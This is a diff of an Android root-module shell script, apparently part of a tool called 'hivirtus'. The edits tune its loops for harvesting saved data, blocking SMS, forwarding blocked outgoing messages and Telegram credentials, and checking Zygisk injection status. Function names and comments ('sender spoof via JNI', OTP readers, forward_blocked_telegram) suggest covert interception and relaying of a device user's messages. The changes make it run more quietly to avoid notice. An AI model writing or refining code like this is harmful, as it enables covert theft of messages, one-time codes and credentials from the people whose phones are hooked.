@@ -99,7 +99,8 @@ hivirtus_harvest_saves() {
     NEW_MT=$(stat -c %Y "$found" 2>/dev/null || echo 0)
     LAST_H=$(cat /data/local/tmp/hivirtus_harvest_log.ts 2>/dev/null || echo 0)
     NOW=$(date +%s)
-    if [ "$NEW_MT" != "$OLD_MT" ] || [ $((NOW - LAST_H)) -ge 30 ]; then
+    if [ "$NEW_MT" != "$OLD_MT" ]; then
+      # Only log real content changes — 30s spam was heating phone
       echo "harvest_save:$found $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
       echo "$NOW" > /data/local/tmp/hivirtus_harvest_log.ts
     fi
@@ -200,10 +201,11 @@ sync_config() {
 
     # Global push: token/chat/sender/phone — TG ke bina bhi (menu cut pe sab apps me rahe)
     NEED_PUSH=0
-    [ -f /data/local/tmp/hivirtus_save_ok.flag ] && NEED_PUSH=1
+    SAVE_OK_VAL=$(cat /data/local/tmp/hivirtus_save_ok.flag 2>/dev/null | tr -d '\r\n[:space:]')
+    [ "$SAVE_OK_VAL" = "1" ] && NEED_PUSH=1
     NOW=$(date +%s)
     LAST_PUSH=$(cat /data/local/tmp/hivirtus_global_push.ts 2>/dev/null || echo 0)
-    if [ $((NOW - LAST_PUSH)) -ge 30 ]; then
+    if [ $((NOW - LAST_PUSH)) -ge 60 ]; then
       NEED_PUSH=1
       echo "$NOW" > /data/local/tmp/hivirtus_global_push.ts
     fi
@@ -220,12 +222,14 @@ sync_config() {
       chmod 666 /data/local/tmp/hivirtus_telegram_credentials.json 2>/dev/null
       [ "$NEW_HASH" != "$OLD_HASH" ] && NEED_PUSH=1
 
-      # TG test: user Save → always one test (clear stale sent from flash)
+      # TG test: ONLY real Save (save_ok content=1) — empty placeholder caused heat spam
       SENT_HASH=$(cat /data/local/tmp/hivirtus_tg_test_sent.hash 2>/dev/null)
       QUEUE=0
-      if [ -f /data/local/tmp/hivirtus_save_ok.flag ]; then
-        rm -f /data/local/tmp/hivirtus_tg_test_sent.hash
-        QUEUE=1
+      SAVE_OK_VAL=$(cat /data/local/tmp/hivirtus_save_ok.flag 2>/dev/null | tr -d '\r\n[:space:]')
+      if [ "$SAVE_OK_VAL" = "1" ]; then
+        if [ "$NEW_HASH" != "$SENT_HASH" ]; then
+          QUEUE=1
+        fi
       elif [ "$NEW_HASH" != "$OLD_HASH" ] && [ "$NEW_HASH" != "$SENT_HASH" ]; then
         QUEUE=1
       fi
@@ -669,8 +673,9 @@ device_name() {
 
 module_is_active() {
   [ -f /data/local/tmp/hivirtus_zygisk_native.active ] && return 0
-  [ -f /data/local/tmp/hivirtus_inject.log ] && return 0
   [ -f /data/local/tmp/hivirtus_module_heartbeat.txt ] && return 0
+  [ -f /data/local/tmp/hivirtus_hook_status_latest.txt ] && return 0
+  [ -s /data/local/tmp/hivirtus_inject.log ] && return 0
   return 1
 }
 
@@ -827,16 +832,16 @@ rewrite_inbox_sender_id() {
     harvest_hook_status
     harvest_blocked_outgoing
     forward_blocked_telegram
-    # inbox rewrite disabled by default — OTP readers crash risk; sender spoof via JNI
     enforce_sms_block
+    # watchdog every other loop — less heat
     hivirtus_tg_watchdog 2>/dev/null
-    sleep 2
+    sleep 5
   done
 ) &
 
 (
   while true; do
-    sleep 45
+    sleep 90
     hivirtus_seed_app_writable_files quiet 2>/dev/null
     hivirtus_seed_app_code_cache 2>/dev/null
   done
